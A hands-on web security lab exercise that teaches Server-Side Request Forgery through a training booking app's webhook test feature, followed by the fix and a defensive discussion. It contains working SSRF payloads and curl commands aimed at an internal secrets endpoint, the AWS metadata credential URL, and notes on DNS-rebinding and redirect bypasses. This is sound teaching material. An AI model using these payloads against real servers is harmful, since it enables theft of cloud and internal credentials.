# Exercise 08 — Server-Side Request Forgery (SSRF): Webhook Test

**Difficulty:** Intermediate  
**Category:** Server-Side Request Forgery  
**OWASP Top 10:** A10:2021 — Server-Side Request Forgery  
**Config flag:** `BookingDojo:Workshop:WebhookSsrf`

---

## Scenario

Partners can register a webhook URL to receive booking events. The platform provides a "Test Webhook" endpoint (`POST /api/webhooks/test`) that POSTs a sample payload to the supplied URL and returns the response. Because the server makes this outbound HTTP request on the caller's behalf, any URL the attacker supplies becomes a request **from the server's network perspective** — not the client's.

BookingDojo also runs an internal configuration endpoint at `GET/POST /api/internal/secret`. It has no authentication — it relies entirely on not being routable from the public internet. The BFF deliberately does not expose it. From your browser you cannot reach it directly. From the server's own loopback, it is wide open.

SSRF bridges that gap.

---

## Background

**Server-Side Request Forgery (SSRF)** occurs when an attacker can cause the server to make an HTTP request to an attacker-controlled target. Because the request originates from the server's network:

- Internal services that only listen on `127.0.0.1` become reachable
- Services that rely on "not being on the internet" as their only access control are fully exposed
- Cloud metadata endpoints (`169.254.169.254`) leak IAM credentials
- Firewall rules that protect internal services from the public internet are bypassed

Common SSRF entry points: webhook URL fields, image/avatar fetch-by-URL, PDF generation from user-supplied URLs, import-from-URL features.

---

## Step 1 — Understand the internal target

The API exposes an endpoint that is intentionally **not** accessible through the BFF:

```
GET /api/internal/secret   (no authentication required)
POST /api/internal/secret
```

Its response contains sensitive internal configuration — DB credentials, Stripe keys, JWT signing secret. In production this kind of endpoint would be on an internal subnet, separated from public traffic by a firewall or VPC boundary. Here, it's on `localhost:5000` alongside the public API.

Try it from your browser: open `http://localhost:5000/api/internal/secret`. In Codespaces the port may not be forwarded, so the browser request fails or prompts for auth — you cannot reach it directly.

But the server can.

---

## Step 2 — Exploit SSRF via the UI

Log in as `partner / Partner1234!` and navigate to **Integrations**.

The page has two sections: **Webhooks** (save a URL permanently) and **Test a URL** (one-off probe). Use **Test a URL** for the attack below.

In the **URL** field, enter:

```
http://localhost:5000/api/internal/secret
```

Click **Send Test**. The response panel shows:

```json
{
  "service": "internal-config-v1",
  "warning": "INTERNAL USE ONLY — protected by network access controls.",
  "database": {
    "primary": {
      "host": "postgres.bookingdojo.internal",
      "port": 5432,
      "name": "bookingdojo_prod",
      "username": "bookingdojo_app",
      "password": "Pr0dD4t4b4s3S3cr3t-2024!"
    }
  },
  "stripe": {
    "secretKey": "sk_live_aBcDeFgHiJkLmN0PqRsTuVwXyZ1234567890",
    "webhookSecret": "whsec_XyZ987654321abcdefghijklmn0pqrstu"
  },
  "internalApiKey": "int-api-k3y-N0tF0rPubl1cUse-2024",
  "jwtSigningSecret": "Pr0dJwtS3cr3t!D0-NOT-SHARE-2024"
}
```

The server fetched the internal endpoint **on your behalf**. The credentials never appeared in any BFF route, never in any authentication header — the firewall-equivalent "it's not routable" protection failed the moment the application was given a URL to fetch.

---

## Step 3 — Exploit via curl

Log in first, then send the SSRF probe:

```bash
curl -s -c cookies.txt -X POST http://localhost:5001/bff/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"partner","password":"Partner1234!"}' | jq .

curl -s -b cookies.txt -X POST http://localhost:5001/bff/webhooks/test \
  -H "Content-Type: application/json" \
  -d '{"url":"http://localhost:5000/api/internal/secret"}' | jq .
```

Expected response:

```json
{
  "url": "http://localhost:5000/api/internal/secret",
  "statusCode": "200",
  "body": "{\"service\":\"internal-config-v1\",\"database\":{\"primary\":{\"password\":\"Pr0dD4t4b4s3S3cr3t-2024!\"...}}",
  "error": null
}
```

---

## Step 4 — Real-world targets (for context)

In a real deployment the same technique reaches:

**Cloud instance metadata (AWS IMDSv1):**
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
Returns IAM role names and temporary credentials (`AccessKeyId`, `SecretAccessKey`, `Token`) — full programmatic access to the AWS account. This address is only reachable from within the EC2 instance; SSRF makes the server fetch it on the attacker's behalf.

> This address does not respond in the local workshop environment — it is shown for real-world context only.

**Other internal services:**
```
http://10.0.1.5:8080/admin/status     # internal admin API
https://10.96.0.1/api/v1/namespaces   # Kubernetes API server
```

> These are fictional addresses used for illustration. In a real deployment they would represent services that rely on VPC boundaries for access control.

---

## Step 5 — Apply the fix

In `appsettings.json`:

```json
"WebhookSsrf": "Fixed"
```

Restart the API and repeat the attack:

```bash
curl -s -b cookies.txt -X POST http://localhost:5001/bff/webhooks/test \
  -H "Content-Type: application/json" \
  -d '{"url":"http://localhost:5000/api/internal/secret"}' | jq .
```

Expected: `400 Bad Request`

```json
{ "message": "URL not allowed: only HTTPS is permitted" }
```

Try other blocked targets:

```bash
# Loopback rejected
curl -s -b cookies.txt -X POST http://localhost:5001/bff/webhooks/test \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:5000/api/internal/secret"}' | jq .

# Link-local (metadata) rejected
curl -s -b cookies.txt -X POST http://localhost:5001/bff/webhooks/test \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}' | jq .

# Private IP rejected
curl -s -b cookies.txt -X POST http://localhost:5001/bff/webhooks/test \
  -H "Content-Type: application/json" \
  -d '{"url":"http://10.0.1.5:8080/admin"}' | jq .
```

All return `400 Bad Request`. The fixed validation rejects:
- Non-HTTPS schemes (`http://`)
- Loopback addresses (`localhost`, `127.0.0.1`, `::1`)
- Private IP ranges (RFC 1918: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`)
- Link-local addresses (`169.254.0.0/16`)
- Internal hostnames (`.internal`, `.local`)

A valid HTTPS public URL still works.

---

## Step 6 — How it works at runtime

```
POST /bff/webhooks/test {"url": "http://localhost:5000/api/internal/secret"}
        │
        ▼
WebhooksController.TestWebhook(url)
        │
        ├─ Vulnerable: no URL validation
        │       │
        │       ▼
        │  HttpClient.PostAsync("http://localhost:5000/api/internal/secret")
        │       │
        │       └─► request originates from the SERVER'S loopback
        │           InternalSecretController has no [Authorize] — responds 200
        │           DB password, Stripe key, JWT secret returned to attacker
        │
        └─ Fixed: URL validated before fetch
                │
                ▼
           scheme = "http" → reject (only HTTPS)
           host  = "localhost" → reject (loopback)
                │
                └─► 400 Bad Request — no outbound request made
```

---

## Step 7 — Discussion

| Defence | Description | Limitations |
|---------|-------------|-------------|
| URL allowlist (known domains only) | Only specific partner-registered domains are callable | Must maintain list; DNS rebinding can bypass |
| IP blocklist (private ranges + loopback) | Block RFC 1918, link-local, loopback | DNS rebinding: attacker resolves to public IP, then flips DNS to 127.0.0.1 |
| Resolve DNS before fetch, validate IP | Resolve hostname → check IP → then fetch that IP | Requires re-validation on every redirect |
| Outbound firewall / egress filtering | Network-level block of private ranges | Defence-in-depth, not sufficient alone |
| Metadata service IMDSv2 | AWS: require token for metadata (SSRF can't get the token) | Doesn't prevent SSRF to other internal services |

**DNS rebinding (SSRF bypass)**

An attacker registers `evil.example.com` pointing at a public IP — it passes the validation. They then flip the DNS TTL-0 record to `127.0.0.1` before the actual fetch resolves. Mitigation: resolve the hostname once at validation time, record the IP, and make the actual connection to that IP — never re-resolve.

**Redirects**

If the external server responds with `HTTP 301 → http://169.254.169.254/`, a naive implementation follows the redirect to the internal address. Fix: disable `AllowAutoRedirect` on the HttpClient, or re-validate each redirect target.

**Why authentication alone is not enough**

`InternalSecretController` has no `[Authorize]`. Even if it did, SSRF can carry the server's own authentication context — if the internal service uses IP-based trust or mutual TLS certificates shared across services, SSRF inherits those too.

---

## Key Takeaways

- **"Not reachable from the internet" is not access control.** Any URL-fetching feature punches through that boundary from the inside.
- **Internal services need their own authentication.** Network controls are defence-in-depth, not the primary gate.
- **Cloud metadata is the highest-value SSRF target.** `169.254.169.254` hands the attacker IAM credentials for the entire account.
- **Validate the URL before the first DNS lookup.** Check scheme, then resolve the hostname to an IP and check that IP. Validation after the fetch is too late.

---

## Further Reading

- [OWASP A10:2021 — Server-Side Request Forgery](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [AWS IMDSv2 — Requiring signed token for instance metadata](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
